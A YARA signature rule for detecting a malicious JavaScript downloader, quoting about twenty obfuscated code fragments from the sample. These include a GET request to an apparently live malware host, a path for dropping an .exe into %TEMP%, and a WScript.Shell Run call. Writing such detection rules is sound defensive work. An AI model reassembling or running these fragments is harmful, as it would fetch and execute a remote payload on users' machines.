rule sig_20160329_c58be9a18ee02e3cfd92401c1d02a826 {
  meta:
    description = "datamaliciousorder - file 20160329_c58be9a18ee02e3cfd92401c1d02a826.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b49af19589904379c7e30a38041efc239b7836aad8fc9b0bcc50a8e8cd5fb98e"

  strings:
    $s1  = "H[QQ](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function NA() {return ZM[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zl7UrKlQvo6hk.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Ak](r() * 11); if (H[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Y(wF, JW){o = o * 1; return wF - JW;};" fullword ascii
    $s5  = "var ZM = function Ci() {return WScript[lV](\"WScript.Shell\");}(), I0 = 11;" fullword ascii
    $s6  = "function AY(){return \"\" + W;};" fullword ascii
    $s7  = "function U() {return ((R == true) && (R == v0)) ? 1 : o;};" fullword ascii
    $s8  = "function fe(Ho){ZM[\"Run\"](Ho, o, o);};" fullword ascii
    $s9  = "function r(){return 22;};" fullword ascii
    $s10 = "function S(e) {var K = (1, 2, 3, 4, 5, e); return K;};" fullword ascii
    $s11 = "function KN(){return lV;};" fullword ascii
    $s12 = "function RK()" fullword ascii
    $s13 = "var j = new this[\"Date\"]();" fullword ascii
    $s14 = " while (yv){" fullword ascii
    $s15 = "return Y(y, LP);" fullword ascii
    $s16 = "var vC = false;" fullword ascii
    $s17 = "var v0 = false;" fullword ascii
    $s18 = "v0 = true; " fullword ascii
    $s19 = "} catch(W0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}